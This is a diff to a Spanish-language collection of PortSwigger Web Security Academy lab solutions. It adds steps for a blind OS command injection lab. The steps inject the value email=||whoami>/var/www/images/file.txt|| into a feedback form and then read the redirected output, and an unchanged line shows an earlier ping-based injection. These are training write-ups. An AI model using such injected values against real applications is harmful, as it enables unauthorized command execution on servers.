@@ -105,6 +105,14 @@
 1. Enviar un mensaje de feedback y capturar la request
 2. Setear el parámetro email=||ping+-c+10+127.0.0.1||
 
+### [Blind OS command injection with output redirection](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)
+
+#### Solución
+
+1. Enviar un mensaje de feedback y capturar la request
+2. Setear el parámetro email=||whoami>/var/www/images/file.txt||
+3. Acceder a https://LABID.web-security-academy.net/image?filename=file.txt
+
 ---
 
 ## [Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
